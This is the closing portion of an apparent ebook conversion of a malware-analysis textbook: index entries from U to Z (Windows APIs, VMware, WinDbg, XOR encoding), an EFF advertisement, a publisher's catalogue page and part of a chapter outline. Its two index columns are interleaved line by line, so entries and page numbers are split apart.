<p class="calibre1">unpacking stub, 383, 384, 389, 692</p>
<p class="calibre1">virtual addresses, automatically </p>
<p class="calibre1">size of, 399</p>
<p class="calibre1">naming, 100</p>
<p class="calibre1">UPack, 388, 398</p>
<p class="calibre1">virtual function tables, 434–435, 715</p>
<p class="calibre1">UPX (Ultimate Packer for </p>
<p class="calibre1">recognizing, 435–436</p>
<p class="calibre1">eXecutables), 14, 388, </p>
<p class="calibre1">virtual functions, vs. nonvirtual, </p>
<p class="calibre1">389, 475</p>
<p class="calibre1">432–436</p>
<p class="calibre1">packing with modified version, </p>
<p class="calibre1">virtual machines, 29–38.  <i class="calibre4">See also</i> anti-</p>
<p class="calibre1">684–685</p>
<p class="calibre1">virtual machine (anti-VM) </p>
<p class="calibre1">tips and tricks, 397</p>
<p class="calibre1">techniques</p>
<p class="calibre1">UPX-packed malware, 479</p>
<p class="calibre1">crashing from procmon, 44</p>
<p class="calibre1">URLDownloadToCacheFile function, 232, </p>
<p class="calibre1">disconnecting network, 32</p>
<p class="calibre1">606, 626, 628, 642</p>
<p class="calibre1">escaping, 380</p>
<p class="calibre1">URLDownloadToFile function, 313, </p>
<p class="calibre1">hiding precise location, 300</p>
<p class="calibre1">462, 482</p>
<p class="calibre1">malware detection on, 42</p>
<p class="calibre1">URLs (uniform resource locators), </p>
<p class="calibre1">malware efforts to detect, 369, </p>
<p class="calibre1">opening to download </p>
<p class="calibre1">670–672</p>
<p class="calibre1">malware, 651–652, 654</p>
<p class="calibre1">option to boot debugger-enabled </p>
<p class="calibre1">USB flash drives, 206</p>
<p class="calibre1">version of OS, 208</p>
<p class="calibre1">user mode</p>
<p class="calibre1">setting up, 580</p>
<p class="calibre1">calls from application, 206–207</p>
<p class="calibre1">structure, 30–31</p>
<p class="calibre1">for debuggers, vs. kernel mode, </p>
<p class="calibre1">taking snapshots, 35–36</p>
<p class="calibre1">168–169</p>
<p class="calibre1">transferring files from, 36</p>
<p class="calibre1">in Windows, 158–159</p>
<p class="calibre1">using multiple, 33</p>
<p class="calibre1">user space</p>
<p class="calibre1">virtual machine team, 33</p>
<p class="calibre1">APC injection from, 263–264</p>
<p class="calibre1">virtual networking, 32, 57</p>
<p class="calibre1">keyloggers, 239–240</p>
<p class="calibre1">Virtual Size, 23–24</p>
<p class="calibre1">looking at code, 215–216</p>
<p class="calibre1">VirtualAlloc function, 596</p>
<p class="calibre1">Poison Ivy use of, 189–190</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">763</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p797"/>VirtualAllocEx function, 255, 256, 423, WaitForSingleObject function, 151</p>
<p class="calibre1">462, 586, 588, 730</p>
<p class="calibre1">WaitForSingleObjectEx function, 263</p>
<p class="calibre1">and direct injection, 257</p>
<p class="calibre1">Watches window, in OllyDbg, 197</p>
<p class="calibre1">and process injection, 254</p>
<p class="calibre1">web applications, Burp Suite for </p>
<p class="calibre1">VirtualProtectEx function, 462</p>
<p class="calibre1">testing, 467</p>
<p class="calibre1">VirtualSize field, in PE header, 365</p>
<p class="calibre1">web browser, malware determination </p>
<p class="calibre1">virus, 4</p>
<p class="calibre1">of default, 699–703</p>
<p class="calibre1">language setting and, 177</p>
<p class="calibre1">WEP (Wired Equivalent Privacy), 34</p>
<p class="calibre1">VirusTotal, 10, 475, 478, 479</p>
<p class="calibre1">while loops, 118</p>
<p class="calibre1">Visualizing Executables for Reversing </p>
<p class="calibre1">WH_KEYBOARD procedures, 260</p>
<p class="calibre1">and Analysis (VERA), 475–476</p>
<p class="calibre1">WH_KEYBOARD_LL procedures, 260</p>
<p class="calibre1">VMcat, 380</p>
<p class="calibre1">whois requests, for domains, 301–302</p>
<p class="calibre1">VMchat, 380</p>
<p class="calibre1">whosthere-alt, 238</p>
<p class="calibre1">VMdrag-n-hack, 380</p>
<p class="calibre1">wide character string, 11</p>
<p class="calibre1">VMdrag-n-sploit, 380</p>
<p class="calibre1">WideCharToMultiByte function, 462</p>
<p class="calibre1">VMftp, 380</p>
<p class="calibre1">Wi-Fi Protected Access (WPA), 34</p>
<p class="calibre1">VMware, 30</p>
<p class="calibre1">Win32 device namespace, 138</p>
<p class="calibre1">artifacts, 370–373</p>
<p class="calibre1">WIN32_SHARE_PROCESS type, 153</p>
<p class="calibre1">configuring, 31–33</p>
<p class="calibre1">WinDbg, 168, 205–227, 475</p>
<p class="calibre1">configuring to create virtual con-</p>
<p class="calibre1">arithmetic operators, 211</p>
<p class="calibre1">nection with host OS, 208–209</p>
<p class="calibre1">breakpoints, 211–212</p>
<p class="calibre1">disk space use, 31</p>
<p class="calibre1">connecting to virtual machine </p>
<p class="calibre1">kernel debugging setup, 207–210</p>
<p class="calibre1">with, 209–210</p>
<p class="calibre1">movie-capture feature, 37</p>
<p class="calibre1">EPROCESS structure examined </p>
<p class="calibre1">Network Address Translation </p>
<p class="calibre1">with, 565</p>
<p class="calibre1">(NAT) mode, 34</p>
<p class="calibre1">finding device driver in </p>
<p class="calibre1">record/replay, 37, 170</p>
<p class="calibre1">memory, 563</p>
<p class="calibre1">risks of using for malware analysis, </p>
<p class="calibre1">vs. IDA Pro, 553</p>
<p class="calibre1">36–37</p>
<p class="calibre1">for kernel debugger, 552</p>
<p class="calibre1">settings to avoid detection, </p>
<p class="calibre1">labs, 228</p>
<p class="calibre1">379–380</p>
<p class="calibre1">solutions, 548–566</p>
<p class="calibre1">Snapshot Manager, 35</p>
<p class="calibre1">loading drivers, 226</p>
<p class="calibre1">VMware Player, 30</p>
<p class="calibre1">module listing, 212</p>
<p class="calibre1">VMware Tools</p>
<p class="calibre1">output, 726</p>
<p class="calibre1">installing, 31</p>
<p class="calibre1">reading from memory, 210–211</p>
<p class="calibre1">stopping service, 371</p>
<p class="calibre1">rootkits, 221–225</p>
<p class="calibre1">VMware Workstation, 30–31, 475</p>
<p class="calibre1">SSDT viewed in, 222</p>
<p class="calibre1"> <i class="calibre4">VMwareService.exe</i>, 370</p>
<p class="calibre1">system breakpoint and, 361</p>
<p class="calibre1"> <i class="calibre4">VMwareTray.exe</i>, 370</p>
<p class="calibre1">viewing driver, 551–553</p>
<p class="calibre1"> <i class="calibre4">VMwareUser.exe</i>, 370</p>
<p class="calibre1">window modes, in IDA Pro, 89–90</p>
<p class="calibre1"> <i class="calibre4">.vmx</i> file, 379</p>
<p class="calibre1">Windows</p>
<p class="calibre1">Volatility Framework, 475</p>
<p class="calibre1">blue screen, 158</p>
<p class="calibre1">Von Neumann architecture, 68</p>
<p class="calibre1">Component Object Model (COM), </p>
<p class="calibre1">vtables, 434–435</p>
<p class="calibre1">154–157</p>
<p class="calibre1">recognizing, 435–436</p>
<p class="calibre1">device drivers, 206</p>
<p class="calibre1">executables, common sections, 22</p>
<p class="calibre1"><b class="calibre3">W</b></p>
<p class="calibre1">following running malware, </p>
<p class="calibre1"> <i class="calibre4">W</i>, at end of Windows function </p>
<p class="calibre1">145–158</p>
<p class="calibre1">name, 17</p>
<p class="calibre1">dynamic link libraries (DLLs), </p>
<p class="calibre1">WaitForMultipleObjectsEx function, 263</p>
<p class="calibre1">145–147</p>
<p class="calibre1"><b class="calibre3">764</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p798"/>exceptions, 157–158</p>
<p class="calibre1">Windows Vista, kernel issues for, </p>
<p class="calibre1">interprocess coordination with </p>
<p class="calibre1">226–227</p>
<p class="calibre1">mutexes, 151–152</p>
<p class="calibre1">Windows XP</p>
<p class="calibre1">processes, 147–149</p>
<p class="calibre1">default search order for loading </p>
<p class="calibre1">services, 152–154</p>
<p class="calibre1">DLLs, 245</p>
<p class="calibre1">threads, 149–151</p>
<p class="calibre1">disabled firewall, 549</p>
<p class="calibre1">functions for importing linked </p>
<p class="calibre1">WinExec function, 462, 482</p>
<p class="calibre1">functions, 15</p>
<p class="calibre1">WinGraph32 application, 98</p>
<p class="calibre1">kernel vs. user mode, 158–159</p>
<p class="calibre1">WinHex, 468, 596–597, 609</p>
<p class="calibre1">Native API, 159–161</p>
<p class="calibre1">WinINet (Windows Internet) API, </p>
<p class="calibre1">reverse shell, 233</p>
<p class="calibre1">145, 313, 504, 639–640</p>
<p class="calibre1">tool for dumping process, 400</p>
<p class="calibre1">advantages and disadvantages, 633</p>
<p class="calibre1">as virtual OS, 31</p>
<p class="calibre1"> <i class="calibre4">wininet.dll</i>, 17, 501</p>
<p class="calibre1">Windows 7, kernel issues in, 226–227</p>
<p class="calibre1">imports from, 480</p>
<p class="calibre1">Windows 32-bit on Windows 64-bit </p>
<p class="calibre1">Winlogon, opening handle to, 603</p>
<p class="calibre1">(WOW64) subsystem, 447</p>
<p class="calibre1">Winlogon Notify, 242</p>
<p class="calibre1">Windows API, 136–139</p>
<p class="calibre1">WinMain function, analysis, 640</p>
<p class="calibre1">code calling functions, 526</p>
<p class="calibre1">WinMD5 calculator, 10, 11</p>
<p class="calibre1">debugger detection with, 352–353</p>
<p class="calibre1">WinObj Object Manager, 138</p>
<p class="calibre1">file system functions, 137–138</p>
<p class="calibre1">Winsock (Windows Sockets) API, 313</p>
<p class="calibre1">handles, 137</p>
<p class="calibre1">Winsock libraries, 143</p>
<p class="calibre1">IDA Pro catalog of named </p>
<p class="calibre1">WinUpack, 398–400, 691–695</p>
<p class="calibre1">constants, 102</p>
<p class="calibre1">Wired Equivalent Privacy (WEP), 34</p>
<p class="calibre1">networking APIs, 143–145</p>
<p class="calibre1">Wireshark, 57, 475, 483</p>
<p class="calibre1">special files, 138–139</p>
<p class="calibre1">DNS and HTTP example, 54</p>
<p class="calibre1">Windows debugger detection, </p>
<p class="calibre1">Follow TCP Stream window, 54</p>
<p class="calibre1">352–356</p>
<p class="calibre1">packet sniffing with, 53–55</p>
<p class="calibre1">manually checking structures, </p>
<p class="calibre1">reviewing capture, 59</p>
<p class="calibre1">353–356</p>
<p class="calibre1">Witty worm, 138</p>
<p class="calibre1">with Windows API, 352–353</p>
<p class="calibre1"> <i class="calibre4">Wlx</i>, function names beginning </p>
<p class="calibre1">Windows File Protection, 604, 605–606</p>
<p class="calibre1">with, 235</p>
<p class="calibre1">Windows functions, 453–463</p>
<p class="calibre1">WlxLoggedOnSAS function, 463</p>
<p class="calibre1">Ex suffix for, 17</p>
<p class="calibre1">Word documents, analyzing with </p>
<p class="calibre1">Windows Internet (WinINet) API, </p>
<p class="calibre1">Process Explorer, 50</p>
<p class="calibre1">145, 313, 504, 639–640</p>
<p class="calibre1">WORD type, in Windows API, 136</p>
<p class="calibre1">advantages and disadvantages, 633</p>
<p class="calibre1">worm, 4</p>
<p class="calibre1">Windows malware, 135–161</p>
<p class="calibre1">WOW64 (Windows 32-bit on Windows </p>
<p class="calibre1">labs, 162–163</p>
<p class="calibre1">64-bit) subsystem, 447</p>
<p class="calibre1">solutions, 513–529</p>
<p class="calibre1">Wow64DisableWow64FsRedirection </p>
<p class="calibre1"> <i class="calibre4">Windows NT/2000 Native API Reference</i> </p>
<p class="calibre1">function, 448, 463</p>
<p class="calibre1">(Nebbett), 160</p>
<p class="calibre1">WPA (Wi-Fi Protected Access), 34</p>
<p class="calibre1">Windows Registry.  <i class="calibre4">See</i> Registry </p>
<p class="calibre1">WriteFile function, 137, 215, 219, 585</p>
<p class="calibre1">(Windows)</p>
<p class="calibre1">origin of handle passed to, 623</p>
<p class="calibre1">Windows Sockets (Winsock) API, 313</p>
<p class="calibre1">WriteProcessMemory function, 255, 256, </p>
<p class="calibre1">Windows Update binary</p>
<p class="calibre1">423, 463, 586, 590, 593</p>
<p class="calibre1">malware creation of handler, </p>
<p class="calibre1">and direct injection, 257</p>
<p class="calibre1">605–606</p>
<p class="calibre1">and process injection, 254</p>
<p class="calibre1">moving to temporary directory, 605</p>
<p class="calibre1"> <i class="calibre4">ws2_32.dll</i>, 17, 144, 483</p>
<p class="calibre1">string to temporary move, 606</p>
<p class="calibre1">imports from, 521</p>
<p class="calibre1">Windows virtual machine, 57</p>
<p class="calibre1">WSAGetLastError function, 144, 313</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">765</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p799"/>WSASocket function, 542, 727</p>
<p class="calibre1">x86 disassembly, 65–85</p>
<p class="calibre1">WSAStartup function, 144, 313, 463, </p>
<p class="calibre1">levels of abstraction, 66–67</p>
<p class="calibre1">542, 727</p>
<p class="calibre1">reverse-engineer, 67–68</p>
<p class="calibre1"> <i class="calibre4">wshtcpip.dll</i>, 483</p>
<p class="calibre1">x87 floating-point unit (FPU), </p>
<p class="calibre1"> <i class="calibre4">WSock32.dll</i>, 17</p>
<p class="calibre1">411–413</p>
<p class="calibre1"> <i class="calibre4">wupdmgr.exe</i>, 604</p>
<p class="calibre1">Xen, 31</p>
<p class="calibre1">launching, 606</p>
<p class="calibre1">XOR cipher, 271–276</p>
<p class="calibre1">brute-forcing, 271–273</p>
<p class="calibre1"><b class="calibre3">X</b></p>
<p class="calibre1">identifying loops in IDA Pro, </p>
<p class="calibre1">274–276</p>
<p class="calibre1">x command, WinDbg, 213</p>
<p class="calibre1">NULL preserving single-byte, </p>
<p class="calibre1">x64 architecture, 441</p>
<p class="calibre1">273–274</p>
<p class="calibre1">differences in calling convention </p>
<p class="calibre1">XOR encoded strings, decoding, </p>
<p class="calibre1">and stack usage, 443–447</p>
<p class="calibre1">542–543</p>
<p class="calibre1">exception handling, 445</p>
<p class="calibre1">XOR encoding loop, 620–621</p>
<p class="calibre1">malware with component for, 729</p>
<p class="calibre1">xor instruction, 76, 596</p>
<p class="calibre1">x64 Windows, kernel issues for, </p>
<p class="calibre1">forms, 275</p>
<p class="calibre1">226–227</p>
<p class="calibre1">searching for, 612–613</p>
<p class="calibre1">x86-64 architecture, 441</p>
<p class="calibre1">searching for nonzeroing, 608</p>
<p class="calibre1">x86 architecture, 68–85</p>
<p class="calibre1">XOR logical operator, in x86 </p>
<p class="calibre1">branching, 80–81</p>
<p class="calibre1">architecture, 75</p>
<p class="calibre1">C main method and offsets, 83–84</p>
<p class="calibre1">xref.  <i class="calibre4">See</i> cross-references (xref)</p>
<p class="calibre1">code types and data access, 408</p>
<p class="calibre1">Xrefs window, in IDA Pro, 96</p>
<p class="calibre1">conditionals, 80</p>
<p class="calibre1">documentation manuals, 85</p>
<p class="calibre1"><b class="calibre3">Y</b></p>
<p class="calibre1">instructions, 69–70</p>
<p class="calibre1">instruction set, general-purpose </p>
<p class="calibre1">YARA, 475</p>
<p class="calibre1">register for, 409</p>
<p class="calibre1">Yuschuk, Oleh, 179</p>
<p class="calibre1">main memory, 69</p>
<p class="calibre1">NOP instruction, 76</p>
<p class="calibre1"><b class="calibre3">Z</b></p>
<p class="calibre1">opcodes and endianness, 70</p>
<p class="calibre1">Zero Wine, 475</p>
<p class="calibre1">operands, 70</p>
<p class="calibre1">zero-day exploit, 33, 245</p>
<p class="calibre1">registers, 71–73, 374</p>
<p class="calibre1">ZF (zero) flag, 72, 80</p>
<p class="calibre1">rep instructions, 81–83</p>
<p class="calibre1">zombies, 234</p>
<p class="calibre1">search for vulnerable instructions, </p>
<p class="calibre1">ZwContinue function, 386</p>
<p class="calibre1">670–672</p>
<p class="calibre1">ZwCreateFile function, 219</p>
<p class="calibre1">simple instructions, 73–76</p>
<p class="calibre1">ZwDeviceIoControlFile function, inline </p>
<p class="calibre1">stack, 77–80</p>
<p class="calibre1">hooking of, 249–250</p>
<p class="calibre1">function calls, 77–78</p>
<p class="calibre1">ZwUnmapViewOfSection function, 258</p>
<p class="calibre1">layout, 78–80</p>
<p class="calibre1">Zynamics BinDiff, 106</p>
<p class="calibre1"><b class="calibre3">766</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p800"/>The Electronic Frontier Foundation (EFF) is the leading organization defending civil liberties in the digital world. We defend free speech on the Internet, fight illegal surveillance, promote the rights of innovators to develop new digital technologies, and work to ensure that the rights and freedoms we enjoy are enhanced — </p>
<p class="calibre1">rather than eroded — as our use of technology grows. </p>
<p class="calibre1">PRIVACY EFF has sued telecom giant AT&amp;T for giving the NSA unfettered access to the private communications of millions of their customers.  eff.org/nsa FREE SPEECH EFF’s Coders’ Rights Project is defending the rights of programmers and security researchers to publish their findings without fear of legal challenges. </p>
<p class="calibre1">eff.org/freespeech</p>
<p class="calibre1">INNOVATION EFF's Patent Busting Project challenges overbroad patents that threaten technological innovation. eff.org/patent</p>
<p class="calibre1">FAIR USE EFF is fighting prohibitive standards that would take away your right to receive and use over-the-air television broadcasts any way you choose.  eff.org/IP/fairuse TRANSPARENCY EFF has developed the Switzerland Network Testing Tool to give individuals the tools to test for covert traffic filtering.  eff.org/transparency INTERNATIONAL EFF is working to ensure that international treaties do not restrict our free speech, privacy or digital consumer rights.  eff.org/global</p>
<p class="calibre1">EFF is a member-supported organization. Join Now!  www.eff.org/support</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p801"/><img src="index-801_1.jpg" alt="Image 159" class="calibre2"/></p>
<p class="calibre1"><img src="index-801_2.jpg" alt="Image 160" class="calibre2"/></p>
<p class="calibre1"><img src="index-801_3.jpg" alt="Image 161" class="calibre2"/></p>
<p class="calibre1"><img src="index-801_4.jpg" alt="Image 162" class="calibre2"/></p>
<p class="calibre1"><img src="index-801_5.jpg" alt="Image 163" class="calibre2"/></p>
<p class="calibre1"><img src="index-801_6.jpg" alt="Image 164" class="calibre2"/></p>
<p class="calibre1">UPDATES</p>
<p class="calibre1">Visit  <i class="calibre4">http://nostarch.com/malware.htm</i> for updates, errata, and other information. </p>
<p class="calibre1"> <i class="calibre4">More no-nonsense books from </i></p>
<p class="calibre1"> <i class="calibre4"> </i> NO STARCH PRESS</p>
<p class="calibre1">METASPLOIT</p>
<p class="calibre1">HACKING, 2ND EDITION</p>
<p class="calibre1">A BUG HUNTER’S DIARY</p>
<p class="calibre1">The Penetration Tester’s Guide</p>
<p class="calibre1">The Art of Exploitation</p>
<p class="calibre1">A Guided Tour Through the Wilds </p>
<p class="calibre1"> <i class="calibre4">by</i> DAVID KENNEDY, JIM O’GORMAN, </p>
<p class="calibre1"> <i class="calibre4">by</i> JON ERICKSON</p>
<p class="calibre1">of Software Security</p>
<p class="calibre1">DEVON KEARNS,  <i class="calibre4">and</i> MATI AHARONI</p>
<p class="calibre1">FEBRUARY 2008, 488 PP. W/CD, $49.95</p>
<p class="calibre1"> <i class="calibre4">by</i> TOBIAS KLEIN</p>
<p class="calibre1">JULY 2011, 328 PP., $49.95 </p>
<p class="calibre1">ISBN 978-1-59327-144-2</p>
<p class="calibre1">NOVEMBER 2011, 208 PP., $39.95</p>
<p class="calibre1">ISBN 978-1-59327-288-3</p>
<p class="calibre1">ISBN 978-1-59327-385-9</p>
<p class="calibre1">THE TANGLED WEB</p>
<p class="calibre1">THE IDA PRO BOOK, </p>
<p class="calibre1">PRACTICAL PACKET </p>
<p class="calibre1">A Guide to Securing Modern Web </p>
<p class="calibre1">2ND EDITION</p>
<p class="calibre1">ANALYSIS, 2ND EDITION</p>
<p class="calibre1">Applications</p>
<p class="calibre1">The Unofficial Guide to the World’s </p>
<p class="calibre1">Using Wireshark to Solve </p>
<p class="calibre1"> <i class="calibre4">by</i> MICHAL ZALEWSKI</p>
<p class="calibre1">Most Popular Disassembler</p>
<p class="calibre1">Real-World Network Problems</p>
<p class="calibre1">NOVEMBER 2011, 320 PP., $49.95 </p>
<p class="calibre1"> <i class="calibre4">by</i> CHRIS EAGLE</p>
<p class="calibre1"> <i class="calibre4">by</i> CHRIS SANDERS</p>
<p class="calibre1">ISBN 978-1-59327-388-0</p>
<p class="calibre1">JULY 2011, 672 PP., $69.95</p>
<p class="calibre1">JULY 2011, 280 PP., $49.95</p>
<p class="calibre1">ISBN 978-1-59327-289-0</p>
<p class="calibre1">ISBN 978-1-59327-266-1</p>
<p class="calibre1"><b class="calibre3">PHONE:</b></p>
<p class="calibre1"><b class="calibre3">EMAIL:</b></p>
<p class="calibre1">800.420.7240 OR</p>
<p class="calibre1">SALES@NOSTARCH.COM</p>
<p class="calibre1">415.863.9900</p>
<p class="calibre1"><b class="calibre3">WEB:</b></p>
<p class="calibre1">WWW.NOSTARCH.COM</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p802"/><img src="index-802_1.png" alt="Image 165" class="calibre2"/></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="outline"/></p>

<h1 class="calibre5" id="calibre_pb_0">Document Outline</h1>
<ul class="calibre6">
<li class="calibre7"><a href="index_split_000.html#p3">Warning</a></li>
<li class="calibre7"><a href="index_split_000.html#p20">About the Authors</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_000.html#p21">About the Technical Reviewer</a></li>
<li class="calibre7"><a href="index_split_000.html#p21">About the Contributing Authors</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p22">Foreword</a></li>
<li class="calibre7"><a href="index_split_000.html#p26">Acknowledgments</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_000.html#p26">Individual Thanks</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p28">Introduction</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_000.html#p29">What Is Malware Analysis? </a></li>
<li class="calibre7"><a href="index_split_000.html#p29">Prerequisites</a></li>
<li class="calibre7"><a href="index_split_000.html#p30">Practical, Hands-On Learning</a></li>
<li class="calibre7"><a href="index_split_000.html#p31">What’s in the Book? </a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p34">0: Malware Analysis Primer</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_000.html#p34">The Goals of Malware Analysis</a></li>
<li class="calibre7"><a href="index_split_000.html#p35">Malware Analysis Techniques</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p35">Basic Static Analysis</a></li>
<li class="calibre7"><a href="index_split_000.html#p35">Basic Dynamic Analysis</a></li>
<li class="calibre7"><a href="index_split_000.html#p36">Advanced Static Analysis</a></li>
<li class="calibre7"><a href="index_split_000.html#p36">Advanced Dynamic Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p36">Types of Malware</a></li>
<li class="calibre7"><a href="index_split_000.html#p38">General Rules for Malware Analysis</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p40">Part 1: Basic Analysis</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_000.html#p42">1: Basic Static Techniques</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p43">Antivirus Scanning: A Useful First Step</a></li>
<li class="calibre7"><a href="index_split_000.html#p43">Hashing: A Fingerprint for Malware</a></li>
<li class="calibre7"><a href="index_split_000.html#p44">Finding Strings</a></li>
<li class="calibre7"><a href="index_split_000.html#p46">Packed and Obfuscated Malware</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p46">Packing Files</a></li>
<li class="calibre7"><a href="index_split_000.html#p47">Detecting Packers with PEiD</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p47">Portable Executable File Format</a></li>
<li class="calibre7"><a href="index_split_000.html#p48">Linked Libraries and Functions</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p48">Static, Runtime, and Dynamic Linking</a></li>
<li class="calibre7"><a href="index_split_000.html#p49">Exploring Dynamically Linked Functions with Dependency Walker</a></li>
<li class="calibre7"><a href="index_split_000.html#p51">Imported Functions</a></li>
<li class="calibre7"><a href="index_split_000.html#p51">Exported Functions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p51">Static Analysis in Practice</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p51">PotentialKeylogger.exe: An Unpacked Executable</a></li>
<li class="calibre7"><a href="index_split_000.html#p54">PackedProgram.exe: A Dead End</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p54">The PE File Headers and Sections</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_000.html#p55">Examining PE Files with PEview</a></li>
<li class="calibre7"><a href="index_split_000.html#p58">Viewing the Resource Section with Resource Hacker</a></li>
<li class="calibre7"><a href="index_split_000.html#p59">Using Other PE File Tools</a></li>
<li class="calibre7"><a href="index_split_000.html#p59">PE Header Summary</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_000.html#p59">Conclusion</a></li>
<li class="calibre7"><a href="index_split_001.html#p60">Lab 1-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p60">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p60">Lab 1-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p61">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p61">Lab 1-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p61">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p61">Lab 1-4</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p61">Questions</a></li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p62">2: Malware Analysis in Virtual Machines</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p63">The Structure of a Virtual Machine</a></li>
<li class="calibre7"><a href="index_split_001.html#p64">Creating Your Malware Analysis Machine</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p64">Configuring VMware</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p67">Using Your Malware Analysis Machine</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p67">Connecting Malware to the Internet</a></li>
<li class="calibre7"><a href="index_split_001.html#p67">Connecting and Disconnecting Peripheral Devices</a></li>
<li class="calibre7"><a href="index_split_001.html#p68">Taking Snapshots</a></li>
<li class="calibre7"><a href="index_split_001.html#p69">Transferring Files from a Virtual Machine</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p69">The Risks of Using VMware for Malware Analysis</a></li>
<li class="calibre7"><a href="index_split_001.html#p70">Record/Replay: Running Your Computer in Reverse</a></li>
<li class="calibre7"><a href="index_split_001.html#p70">Conclusion</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p72">3: Basic Dynamic Analysis</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p73">Sandboxes: The Quick-and-Dirty Approach</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p73">Using a Malware Sandbox</a></li>
<li class="calibre7"><a href="index_split_001.html#p74">Sandbox Drawbacks</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p75">Running Malware</a></li>
<li class="calibre7"><a href="index_split_001.html#p76">Monitoring with Process Monitor</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p77">The Procmon Display</a></li>
<li class="calibre7"><a href="index_split_001.html#p77">Filtering in Procmon</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p80">Viewing Processes with Process Explorer</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p80">The Process Explorer Display</a></li>
<li class="calibre7"><a href="index_split_001.html#p81">Using the Verify Option</a></li>
<li class="calibre7"><a href="index_split_001.html#p82">Comparing Strings</a></li>
<li class="calibre7"><a href="index_split_001.html#p82">Using Dependency Walker</a></li>
<li class="calibre7"><a href="index_split_001.html#p83">Analyzing Malicious Documents</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p83">Comparing Registry Snapshots with Regshot</a></li>
<li class="calibre7"><a href="index_split_001.html#p84">Faking a Network</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p84">Using ApateDNS</a></li>
<li class="calibre7"><a href="index_split_001.html#p85">Monitoring with Netcat</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p86">Packet Sniffing with Wireshark</a></li>
<li class="calibre7"><a href="index_split_001.html#p88">Using INetSim</a></li>
<li class="calibre7"><a href="index_split_001.html#p89">Basic Dynamic Tools in Practice</a></li>
<li class="calibre7"><a href="index_split_001.html#p93">Conclusion</a></li>
<li class="calibre7"><a href="index_split_001.html#p94">Lab 3-1</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p94">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p94">Lab 3-2</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p94">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p94">Lab 3-3</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p94">Questions</a></li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p95">Lab 3-4</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p95">Questions</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="calibre7"><a href="index_split_001.html#p96">Part 2: Advanced Static Analysis</a>
<ul class="calibre8">
<li class="calibre7"><a href="index_split_001.html#p98">4: A Crash Course in x86 Disassembly</a>
<ul class="calibre9">
<li class="calibre7"><a href="index_split_001.html#p99">Levels of Abstraction</a></li>
<li class="calibre7"><a href="index_split_001.html#p100">Reverse-Engineering</a></li>
